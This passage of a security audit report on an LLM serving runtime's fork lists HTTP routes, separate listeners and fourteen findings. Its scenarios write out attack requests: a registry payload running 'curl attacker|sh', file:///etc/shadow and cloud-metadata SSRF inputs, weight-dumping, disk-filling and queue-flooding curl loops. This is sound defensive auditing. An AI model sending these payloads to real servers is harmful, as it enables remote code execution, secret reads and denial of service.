| `/update_weights_from_disk` | POST | `:1434` | swaps model weights from a caller-named path |
| `/update_weights_from_{tensor,distributed,ipc}` | POST | `:1570`,`:1592`,`:1612` | |
| `/init_weights_update_group`, `/destroy_weights_update_group` | POST | `:1538`, `:1554` | |
| `/init_weights_send_group_for_remote_instance`, `/send_weights_to_remote_instance` | POST | `:1463`, `:1482` | |
| `/release_memory_occupation`, `/resume_memory_occupation` | GET,POST | `:1682`, `:1694` | GET mutates |
| `/slow_down` | GET,POST | `:1746` | GET mutates |
| `/load_lora_adapter`, `/load_lora_adapter_from_tensors`, `/unload_lora_adapter` | POST | `:1760`,`:1771`,`:1783` | |
| `/open_session`, `/close_session` | GET,POST | `:1794`, `:1808` | GET mutates |
| `/configure_logging` | GET,POST | `:1818` | GET mutates |
| `/abort_request` | POST | `:1828` | |
| `/pause_generation`, `/continue_generation` | POST | `:1906`, `:1919` | |
| `/set_internal_state` | POST,PUT | `:995` | |
| `/dumper/{method}` | POST | `:1007` | registered only if `os.environ.get("DUMPER_SERVER_PORT") == "reuse"` (`:1005`); dispatch is a 3-way allowlist `dumper.py:1375-1385` |
| `/v1/completions`, `/v1/chat/completions`, `/v1/responses`, `/v1/score`, `/v1/messages`, `/api/{chat,generate}`, `/invocations`, `/vertex_generate` | POST | `:1935`,`:1943`,`:2397`,`:2389`,`:2499`,`:2470`,`:2476`,`:2526`,`:2537` | NORMAL |
| `/v1/audio/transcriptions` | POST | `:2237` | NORMAL, multipart upload |
| `/v1/responses/{response_id}/cancel` | POST | `:2432` | NORMAL |

#### 2.2b Separate listeners

`rg 'uvicorn.run|HTTPServer\(|web.run_app|TCPSite'`, tests excluded. Each is
its own `FastAPI()`/`HTTPServer` instance, so the main app's middleware
(`http_server.py:2957-2963`) does **not** reach any of them.

| Listener | file:line | fork/upstream | Default bind | Auth |
|---|---|---|---|---|
| main runtime | `http_server.py:3038`,`:3084` | upstream | `127.0.0.1:30000` | per §0 |
| registry control plane | `registry/launch.py:122` | **fork** | `127.0.0.1:8500` (`launch.py:68-69`) | **none** |
| video enhance | `video_enhance/server.py:1252` (`create_app`) | **fork** | no in-tree bind — booted as an opaque registry `process` tenant | **none** |
| planner web UI | `planner/webui.py:5705` | **fork** | `127.0.0.1:8780` (`:5701`, `planner/cli.py:219-220`) | **none** |
| rigmon aggregator | `rigmon/aggregator.py:527` | **fork** | `127.0.0.1:8770` (`rigmon/config.py:89-90`) | **push token + loopback pin** |
| gRPC HTTP sidecar | `grpc_server.py:206-207` | upstream | `server_args.host`, `port+1` | none by construction (`server_args.py:7848`) |
| debug dumper | `debug_utils/dumper.py:1393` | upstream | **`0.0.0.0` hardcoded** | none |
| PD bootstrap | `engine_info_bootstrap_server.py:90` | upstream | caller-supplied | none |
| PD conn / dp-rank registry | `disaggregation/common/conn.py:1700` | upstream | caller-supplied | none |
| local proxy | `disaggregation/local_proxy.py:177` | upstream | `127.0.0.1` (`:160`) | none |
| encode server | `disaggregation/encode_server.py:3678`,`:3768` | upstream | `server_args.host` | none |
| hf3fs metadata | `mem_cache/storage/hf3fs/mini_3fs_metadata_server.py:333` | upstream | caller-supplied | none |
| multimodal_gen runtime | `multimodal_gen/runtime/launch_server.py:551` | upstream | `server_args.host` | inherits |
| mini_lb | `sgl-model-gateway/.../mini_lb.py:260`+ | upstream | CLI | none |

**Registry** (`registry/http_api.py`, fork): `POST /registry/engines` `:87`,
`DELETE /registry/engines/{engine_id}` `:95`,
`POST /registry/engines/{id}/state` `:101`, `.../pin` `:124`,
`POST /registry/default_hot` `:155`, `POST /registry/idle` `:161`,
`POST /registry/plan` `:195`; `GET /registry` `:81` and `GET /registry/cards`
`:166` **mutate** (both call `registry.refresh_measured()` at `:84`/`:169`).
Every write route takes `body: dict = Body(...)` — untyped, so pydantic
validates nothing.

**Video enhance** (`video_enhance/server.py`, fork): `POST /v1/video/enhance`
`:1292`, **`GET /v1/video/enhance` `:1319`** (claims a job id at `:1376`,
starts an asyncio task, spawns ffmpeg, runs the GPU chain — a GET that boots
GPU work), `GET /v1/video/tracks` `:1393` (spawns ffprobe),
`DELETE /v1/video/enhance/{job_id}` `:1448`, plus read routes at
`:1407`,`:1414`,`:1468`,`:1495`,`:1499`,`:1515`.

**Planner web UI** (`planner/webui.py`, fork): `do_POST` at `:5455` dispatches
`/api/server_start` `:5514` (spawns the managed sglang server),
`/api/server_stop` `:5517`, `/api/server_restart` `:5520`,
`/api/model_download` `:5526`, `/api/version/switch` `:5640`,
`/api/registry/{plan,state,engines}` `:5650`,`:5653`,`:5656`; `do_DELETE`
drops config profiles `:5673`, bench history `:5681`, registry engines `:5689`.
No `Authorization` read anywhere in the file (`rg -c 'Authorization'` → 0).
`_read_json` at `:5170-5173` reads `Content-Length` bytes with no cap.

**Rigmon** is the counter-example and the model the others should follow:
push token verified at `aggregator.py:493-502`, token mint pinned to loopback
at `:431-435`, non-loopback bind without a token refused at startup
(`config.py:105-110`, enforced `aggregator.py:520-522`), body size capped
`:455-459`. Its gap is only that the read routes `/api/nodes`,
`/api/snapshot`, `/api/series` (`:413-427`) carry no token check.

---

### 2.3 Findings

| ID | file:line | What | Concrete scenario (NOT executed) | Class |
|---|---|---|---|---|
| **F1** | `http_server.py:1706-1722`; `io_struct.py:1803`; `weight_updater.py:333-335`; `hibernate.py:417-420` | `/hibernate` takes a caller-supplied `hibernate_dir` that **overrides** `--hibernate-dir`, reaching `os.makedirs()` + `os.path.join()` with no validation, allowlist or `..` rejection. Separately, a bare **GET** parks the server. | `curl -XPOST http://rig:30000/hibernate -d '{"hibernate_dir":"/var/www/html/pub"}'` writes every rank's full post-transform weight shards plus a manifest into an attacker-named directory (weight exfiltration if that dir is web-served; disk exhaustion otherwise). `curl http://rig:30000/hibernate` alone parks the model. | **PRIO** |
| **F2** | `auth.py:161-167` (executed matrix, §0) | `--admin-api-key` alone leaves every `NORMAL` route fully open. The flag's own help text (`server_args.py:2645-2648`) says it protects "sensitive management endpoints", and the fork's newest state-changing routes (`/v1/files`, `/v1/fine_tuning/jobs`, both workbench writers, `/v1/images/*`, `/v1/audio/speech`) all landed at NORMAL. | Operator boots with `--admin-api-key S3CR3T` believing the box is locked. `curl -XPOST http://rig:30000/x-htsglang/workbench/pause -d '{"paused":true}'` succeeds with no credential. | **PRIO** |
| **F3** | `http_server.py:595-601` | Wildcard CORS with `allow_credentials=True` on the main app. Defeats the loopback-bind defense for every route in §1a. | Operator opens any web page while a runtime is up on `127.0.0.1:30000`. That page's JS POSTs `/hibernate`, `/vram_budget`, `/flush_cache`, `/v1/files` and **reads the responses**. Upstream-authored, but the fork's own high-value routes are what is now behind it. | **PRIO** |
| **F4** | `class3_utility.py:171-186` → `process.py:112-119`; route `registry/http_api.py:87` + `:101`; no auth in `http_api.py`/`launch.py` | Registry `spec.launch["argv"]` is an opaque, unvalidated argv handed to `subprocess.Popen(..., start_new_session=True)`. `POST /registry/engines` then `POST /registry/engines/{id}/state {"target":"HOT"}` is arbitrary command execution as the registry user, with attacker-controlled `env`. `shell=False`, so this is not injection — the argv *is* the payload. Loopback-by-default (`launch.py:68`) is the only barrier, and the registry app has no `CORSMiddleware`, so F3 does not chain into it. | `POST /registry/engines {"engine_id":"x","adapter":"process","launch":{"argv":["/bin/sh","-c","curl attacker|sh"],"budget_mib":1}}` then `POST /registry/engines/x/state {"target":"HOT"}`. | **Backlog** (critical severity; needs `--host` widened past the `127.0.0.1` default, or a local foothold) |
| **F5** | `mux.py:143-154`, `mux.py:355`/`:393`, `codec.py:582`,`:788`,`:885`; routes `video_enhance/server.py:1292`,`:1319`,`:1393` | `source_url` reaches ffprobe/ffmpeg as an input with **no scheme allowlist, no `..` rejection, no SSRF check**. ffprobe stderr is reflected to the caller (`mux.py:158-160` → `server.py:1405`), making it an oracle. Argv is a list everywhere (no shell injection). | `GET /v1/video/tracks?source_url=file:///etc/shadow` returns ffprobe's error text on the file; `source_url=http://169.254.169.254/...` reaches link-local metadata. Reachable via a **GET**. | **Backlog** (video app has no in-tree bind; runs only when booted as a registry tenant) |
| **F6** | `training/service.py:255-256` vs `:269` | `create_file` has **no `if not self.config.enabled` guard**, unlike `create_job` which does. `POST /v1/files` therefore writes to disk on **every** boot, including servers that never enabled `--enable-training-tenant`. Cap is 2 GiB *per file* (`store.py:57`, `:249-254`) with **no total-store quota** (`rg 'quota|total_bytes|max_files' store.py` → 0 hits), and the body is fully buffered in RAM before the cap applies (`http_server.py:2088`, `content=await file.read()`). Root defaults to `/var/tmp/htsglang/training` (`feasibility.py:908-913`). | Loop `curl -XPOST http://rig:30000/v1/files -F purpose=fine-tune -F file=@2gib.jsonl` until `/var/tmp` is full; or send one 2 GiB body to force a 2 GiB allocation on a swapless box. | **PRIO** |
| **F7** | `http_server.py:2225`; `workbench/http_api.py:76-93`; `fp8_tuner.py:294-317` | `/x-htsglang/workbench/enqueue` has **no queue cap** (`fp8_tuner.py:314-315` is a plain `list.append` deduped by key only), **no magnitude bound** on `n`/`k`/`batch_size`/`block_n`/`block_k` (bare `int()` casts at `:294-302`), and **no rate limit** anywhere under `workbench/`. The only value check is the `("fp8","int8")` allowlist at `:309-313`. Correctly gated on `--enable-idle-workbench` at the service layer (`workbench/service.py:110-115`, called `:147`) — the gate is real and I read it. | With the flag on: `for i in $(seq 100000); do curl -XPOST .../workbench/enqueue -d "{\"tenant\":\"fp8_tuner\",\"item\":{\"n\":$i,\"k\":99999999}}"; done` — unbounded GPU autotune queue growth from an unauthenticated peer. | **Backlog** (needs `--enable-idle-workbench`) |
| **F8** | `registry/http_api.py:95`,`:101`,`:120`,`:155`,`:161`; `arbiter.py:430-457`,`:929-959` | Registry destructive routes with **no confirmation token, no dry-run requirement, no idempotency key**. `allow_eviction` **defaults to `True`** (`http_api.py:120`), so a plain `{"target":"HOT"}` may evict neighbours. `POST /registry/idle` with an empty body (`Body(default={})`, `:162`) demotes every non-pinned, non-default engine to COLD and re-promotes the resting set — a rig-wide GPU churn from a bodyless POST; `{"force":true}` removes the only timer guard (`arbiter.py:939-941`). `POST /registry/default_hot` with a missing `engines` key silently empties the resting set (`:158`, `list(body.get("engines") or [])`). | `curl -XPOST http://rig:8500/registry/idle` — no body, no token, unloads the hot models. | **Backlog** (same reachability condition as F4) |
| **F9** | `auth.py:70-80` | Auth-level resolution **fails open to NORMAL**: `except Exception: continue` per route, then `return AuthLevel.NORMAL` when nothing matched. A FastAPI/Starlette upgrade that changes `route.matches()` semantics silently downgrades every `ADMIN_OPTIONAL` route. | Harmless when `--api-key` is set (NORMAL still requires it). Becomes real the moment someone runs `--admin-api-key` only: every admin route silently becomes open. | **Pin** — condition: an admin-key-only deployment, or any route-matching regression. |
| **F10** | `debug_utils/dumper.py:1393` | `HTTPServer(("0.0.0.0", http_port), handler_class)` — bind address hardcoded, not configurable, no auth on the handler. Opt-in: `server_port` defaults to `"-1"` → parsed `None` → disabled (`dumper.py:144`,`:201`, gate at `:1362-1365`). Dispatch is a 3-way allowlist (`get_state`/`configure`/`reset`, `:1375-1385`), so no arbitrary method invocation; `configure(**body)` is a kwargs splat (crash surface, not RCE). | Anyone who sets `DUMPER_SERVER_PORT` to a real port for a debugging session exposes dumper control to the whole LAN, with no way to restrict the bind. | **Pin** — condition: `DUMPER_SERVER_PORT` set to a numeric port. |
| **F11** | `planner/webui.py:5455`,`:5514`,`:5170-5173`; `cli.py:219-220` | Planner web UI: full process-control API (start/stop/restart the managed server, trigger model downloads, switch dashboard versions, delete config profiles and bench history) with **zero auth**, and `_read_json` reads `Content-Length` bytes with no cap. `--host` is free-form with **no refusal for a non-loopback bind** — unlike rigmon, which refuses exactly that (`rigmon/config.py:105-110`). | `curl -XPOST http://rig:8780/api/server_stop -d '{}'`. | **Backlog** (loopback default; PRIO the moment `--host 0.0.0.0` is passed, which nothing prevents) |
| **F12** | `training/service.py:377-391`, sink `:383` `if Path(candidate).is_dir()`, used `:422` `self.model_profiler(job.base_model_path)` | `POST /v1/fine_tuning/jobs` accepts `x-htsglang.base_model_path` as a raw filesystem path, tried **before** `--training-model-root` and never confined by it (`model_root` is only appended as an extra candidate at `:381`). Existence is reflected in the error message (`:385-390` lists every candidate tried). | With the tenant enabled: an unauthenticated directory-existence oracle over the whole filesystem, plus model loading from an arbitrary directory. | **Backlog** (needs `--enable-training-tenant`) |
| **F13** | `video_enhance/server.py:1448`,`:1097-1114`, id policy `:185-201` | `DELETE /v1/video/enhance/{job_id}` destroys a running job (executor cancelled, rings closed, task killed) with **no confirmation, no ownership check, no idempotency key**. Job ids are **client-chosen** (`normalize_job_id` `:185`, docstring `:190-193`) and accepted at 1-64 chars of `[A-Za-z0-9-_]`, so a short predictable id is guessable; cancelled jobs are never popped from `self.jobs`, so ids leak. | `curl -XDELETE http://vid:PORT/v1/video/enhance/job1`. | **Backlog** (same reachability as F5) |
| **F14** | `auth.py:121-122` | The exempt-path list is a **prefix** match (`path.startswith("/health")`, `path.startswith("/metrics")`), not an equality or set membership check. | No current state-changing route starts with either prefix — verified against the full route inventory in §1a. Becomes real the day someone adds `/health_reset`, `/metrics_clear` or similar. | **Pin** — condition: any new route whose path starts with `/health` or `/metrics`. |

**Explicit non-issues, recorded so they are not re-flagged:**

- `/v1/files` path handling is the best-defended surface in the tree.
  `_safe_filename` (`store.py:134-144`) takes `os.path.basename`, substitutes
  everything outside `[A-Za-z0-9._-]` (`_SAFE_NAME`, `:132`) and truncates to
  200 chars; the path is built from a **server-generated** `file_id`
  (`:262-263`, `secrets.token_hex`), and the client-supplied `{file_id}` is a
  dict key only (`:288`, `:300`, `:304`) — no traversal reachable. Purpose is
  allowlisted (`:245-248`) and JSONL is structurally validated (`:259-261`).
  The finding against it is F6 (quota/buffering), not traversal.
- `/vram_budget` is correctly validated: `budget_mib` 0 or negative is rejected
  against the pinned floor with exact arithmetic (`vram_dial.py:514-524`), the
  ceiling is clamped (`:525-532`), `release_fraction` is range-checked
  (`:508-511`), and the whole route is gated on `--enable-vram-dial`
  (`scheduler.py:4997-5004`).
- `/kv_reshard` target vectors are allowlisted against `--kv-reshard-vectors`
  (`kv_reshard.py:340-344`) and the route is gated at `scheduler.py:4964`.
- `video_enhance` `job_id` and the preview `which` parameter reach no
  filesystem sink — `rg 'open\(|Path\(|os\.|shutil' video_enhance/server.py`
  returns zero matches; `which` is allowlisted twice (`:1427-1431`, `:1032-1035`).
- No `shell=True` and no string-interpolated command anywhere on the audited
  paths: `process.py:112` and `mux.py:154`/`:393` and `codec.py:585`/`:788`
  are all list-argv.
- `/hicache/storage-backend` PUT/DELETE are the only routes that actually
  demand the admin key (`http_server.py:1289-1290`, `:1321-1322`,
  `:1345-1346`). That pattern is the fix template for F2.

---

### 2.4 Sub-task: the CT208 nginx snippet

File: **`scripts/translator/nginx-translator.conf.template`** on
`origin/feat/live-translator-466` (read via `git -C /spinning/htsglang show`;
no ssh, no network call, no change to CT208).

**It does NOT mount `/translate/`-prefixed paths exclusively.** There are two
location blocks, and the second is a catch-all. Verbatim:

```nginx
    # The live conversation socket. Long-lived, bidirectional, unbuffered.
    location /api/translator/stream {
        proxy_pass http://${TRANSLATOR_UPSTREAM}:${TRANSLATOR_PORT};
        ...
    }

    # The PWA itself and the REST surface.
    location / {
        proxy_pass http://${TRANSLATOR_UPSTREAM}:${TRANSLATOR_PORT};
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        ...
    }
```

plus a port-80 server that redirects the known host and `return 444;`
otherwise (lines 81-89).

**Verdict: the catch-all does not expose the runtime's state-changing routes,
because the upstream is a different process — but the safety rests entirely on
one placeholder's value, not on the location blocks.**

- `${TRANSLATOR_PORT}` defaults to **30800**
  (`scripts/translator/check_tunnel.sh:19`), and 30800 is the translator's own
  server: `parser.add_argument("--port", type=int, default=30800)` at
  `python/sglang/srt/translator/launch.py:35`, served by its own
  `app = FastAPI(title="htsglang live translator", version="1")` at
  `translator/server.py:469` via `uvicorn.run(app, ...)` at `launch.py:323`.
  That app is **not** the runtime app: it registers only
  `/api/translator/*`, `/`, `/manifest.webmanifest` (`server.py:472-601`) and
  does no `include_router`/`mount` of `srt/entrypoints/http_server.py`.
- The runtime's default port is 30000 (`server_args.py:2596`). **Pointing
  `TRANSLATOR_PORT` at 30000 — a one-character edit in `/root/rig-env.sh` —
  would publish the entire §1a inventory, `/hibernate` and `/vram_budget`
  included, to the public internet behind a valid Certbot certificate.**
  Nothing in the template constrains which port it may name.
- The `location /` block therefore publishes the **whole translator app**
  outward with **no auth** — no `auth_basic`, no token check in the template,
  and `rg 'Authorization|api_key' translator/server.py` finds nothing. That
  means `POST /api/translator/sessions` (`server.py:489`),
  `POST /api/translator/enroll/{session_id}` (`:501`),
  `POST /api/translator/sessions/{session_id}/{routing,voice}` (`:524`,`:561`)
  and `DELETE /api/translator/sessions/{session_id}` (`:581`) are
  internet-reachable state changes, and the enroll route drives ASR/TTS GPU
  work with `client_max_body_size 32m` (template line 46).
- Path-traversal check on that surface: `session_id` is a dict key only
  (`translator/session.py:1110-1111`, `:1122`, `:1137-1138`) and reaches no
  filesystem sink — so the client-chosen `session_id`
  (`server.py:493`, `open_session(..., body.get("session_id"))`) is a
  session-hijack/enumeration concern, not a traversal one.

**Classification of the snippet itself: Backlog.** It is a hand-apply
deliverable, explicitly not auto-installed (template lines 12-14), and its
default upstream is the translator process. The pin condition to record:
*if `TRANSLATOR_UPSTREAM:TRANSLATOR_PORT` is ever set to the runtime's
host:port, `location /` publishes the full state-changing surface of §1a to
the internet.* A `location /api/translator/` prefix in place of `location /`
(plus an explicit block for `/` and `/manifest.webmanifest`) would remove that
failure mode entirely.

---

### 2.5 What Axis 2 did NOT cover (honest coverage)

Stated plainly so the next sweep does not assume this axis is closed.

**Not audited at all:**
- `python/sglang/multimodal_gen/` route surface (image/video/mesh/VLA/rollout
  APIs, `POST /update_weights_from_disk` at
  `runtime/entrypoints/post_training/weights_api.py:19`, `DELETE /v1/videos/{video_id}`
  at `openai/video_api.py:710`, `POST /v1/set_lora` at `openai/common_api.py:63`).
  Confirmed upstream-provenance and enumerated in §1b, but no validation or
  auth tracing was done. This is a full second runtime with its own auth story.
- `rust/` and `sgl-model-gateway/` beyond confirming `mini_lb.py`'s four
  routes exist. The Rust router (`experimental/sgl-router/src/proxy/`) was not
  read.
- `disaggregation/encode_server.py` routes (`/encode` `:3805`, `/send` `:4053`,
  `/scheduler_receive_url` `:4093`) — listed, not traced.
- WebSocket surfaces: `entrypoints/openai/realtime/session.py`, the translator
  `/api/translator/stream` handler body, `realtime_video_api.py`.
- The dashboard **frontend** (§14) — only the planner backend was read.
- `memtier` — the briefing named it; I found no such module
  (`rg -l memtier python/` → nothing). If it exists under another name it was
  missed.

**Checked shallowly (route + gate only, no downstream validation trace):**
- All upstream weight-update routes (`/update_weights_from_*`,
  `/init_weights_*`, `/send_weights_to_remote_instance`). Their path/URL
  arguments were **not** traced to their sinks. Given F1's result on
  `hibernate_dir`, I expect at least `/update_weights_from_disk` to take an
  unvalidated path — that is an assumption, not a finding, and it needs its
  own trace.
- `/session_handover`: I read the route and the request struct
  (`io_struct.py:1444-1465`) but did not trace `manifest_json` into the
  session store, so I cannot say whether a hostile manifest can name paths.
  Marked med-risk on that uncertainty, not on evidence.
- The registry `class1_srt`/`class2_diffusion` adapters beyond the `argv` and
  `model_path` lines quoted in F4.

**Not done at all:**
- **Nothing was executed against a live server.** The only code executed is
  the pure `decide_request_auth` matrix in §0. Every exploit scenario in §2 is
  a reasoned trace from source, not a demonstration. Per the "success claims"
  law, treat each one as a testable claim until a falsifier runs it.
- No check of whether a reverse proxy in front of the rig already filters any
  of this.
- No review of the `test/registered/` suites for gates that already pin any of
  these behaviours.
